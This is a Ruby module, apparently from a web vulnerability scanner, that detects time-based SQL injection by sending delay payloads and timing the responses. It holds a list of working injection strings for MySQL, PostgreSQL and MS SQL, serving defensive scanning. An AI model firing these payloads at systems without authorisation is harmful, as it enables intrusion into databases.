require 'kmeans-clusterer'

module ScannerExtensions
  module Extensions
    class TimeSqli < BaseExtension; end

    class FastTimeSqli < TimeSqli
      def initialize
        super
        @components = :fast
        @payloads = [
          %{SLEEP(%<time>s)/*'XOR(SLEEP(%<time>s))OR'|"XOR(SLEEP(%<time>s))OR"*/}
        ]
      end
    end

    class TimeSqli < BaseExtension
      def initialize
        @type                = :detect
        @general_object_type = :param
        @extension_type      = :vuln
        @detect_type         = :sqli
        @components          = :rechecker

        @defaults = {
          base_time: 5,
          max_delta: 0.30
        }

        @payloads = [
          # MYSQL
          %{SLEEP(%<time>s)/*'XOR(SLEEP(%<time>s))OR'|"XOR(SLEEP(%<time>s))OR"*/},
          %{%%23'%%23"%%0a-sleep(%<time>s)%%23},
          # MYSQL AND
          %{%<prefix>s) AND SLEEP(%<time>s) AND (1=1},
          %{%<prefix>s AND SLEEP(%<time>s)},
          %{%<prefix>s AND SLEEP(%<time>s)-- wlrm},
          %{%<prefix>s') AND SLEEP(%<time>s) AND ('wlrm'='wlrm},
          %{%<prefix>s' AND SLEEP(%<time>s) AND 'wlrm'='wlrm},
          %{%<prefix>s%%' AND SLEEP(%<time>s) AND '%%'='},
          # MYSQL OR
          %{%<prefix>s) OR SLEEP(%<time>s) AND (1=1},
          %{%<prefix>s OR SLEEP(%<time>s)},
          %{%<prefix>s OR SLEEP(%<time>s)-- wlrm},
          %{%<prefix>s') OR SLEEP(%<time>s) AND ('wlrm'='wlrm},
          %{%<prefix>s' OR SLEEP(%<time>s) AND 'wlrm'='wlrm},
          %{%<prefix>s%%' OR SLEEP(%<time>s) AND '%%'='},
          # POSTGRESS
          %{%<prefix>s) AND 1=(SELECT 1 FROM PG_SLEEP(%<time>s)) AND (3077=3077},
          %{%<prefix>s AND 1=(SELECT 1 FROM PG_SLEEP(%<time>s))},
          %{%<prefix>s AND 1=(SELECT 1 FROM PG_SLEEP(%<time>s))-- wlrm},
          %{%<prefix>s') AND 1=(SELECT 1 FROM PG_SLEEP(%<time>s)) AND ('wlrm'='wlrm},
          %{%<prefix>s' AND 1=(SELECT 1 FROM PG_SLEEP(%<time>s)) AND 'wlrm'='wlrm},
          %{%<prefix>s) WAITFOR DELAY '0:0:%<time>s' AND (1=1},
          %{%<prefix>s);SELECT PG_SLEEP(%<time>s)--},
          %{%<prefix>s;SELECT PG_SLEEP(%<time>s)--},
          %{%<prefix>s');SELECT PG_SLEEP(%<time>s)--},
          %{%<prefix>s';SELECT PG_SLEEP(%<time>s)--},
          %{%<prefix>s%%';SELECT PG_SLEEP(%<time>s)--},
          # MS SQL
          %(%<prefix>s'; WAITFOR DELAY '0:0:%<time>s'--),
          %(%<prefix>s WAITFOR DELAY '0:0:%<time>s'),
          %(%<prefix>s WAITFOR DELAY '0:0:%<time>s'-- wlrm),
          %{%<prefix>s') WAITFOR DELAY '0:0:%<time>s' AND ('wlrm'='wlrm},
          %(%<prefix>s' WAITFOR DELAY '0:0:%<time>s' AND 'wlrm'='wlrm),
          %(%<prefix>s%%' WAITFOR DELAY '0:0:%<time>s' AND '%%'='),
          %{%<prefix>s);WAITFOR DELAY '0:0:%<time>s'--},
          %(%<prefix>s;WAITFOR DELAY '0:0:%<time>s'--),
          %(%<prefix>s';WAITFOR DELAY '0:0:%<time>s'--),
          %(%<prefix>s%%';WAITFOR DELAY '0:0:%<time>s'--),
          %{%<prefix>s) WAITFOR DELAY '0:0:%<time>s' AND (1=1}
        ]
      end

      def run(object, params)
        params    = @defaults.merge(params)
        params[:with_prefix] = true
        detector = SleepKmeans.new(object, @payloads, params)
        detector.perform_detect
        if detector.detect_anomaly?
          curl1 = object.curl_helper(
            value: format(detector.vuln_payload, time: 0, prefix: detector.get_injection_prefix)
          )
          curl2 = object.curl_helper(
            value: format(detector.vuln_payload, time: detector.base_time * 2, prefix: detector.get_injection_prefix)
          )
          object.vuln(
            extension: 'time_sqli',
            template: '/sqli/time_detect',
            binding: :protocol,
            args: {
              curl1: curl1,
              time1: detector.normal_response_time.round(3),
              curl2: curl2,
              time2: detector.anomaly_response_time.round(3)
            }
          )
        end

      end
    end
  end
end
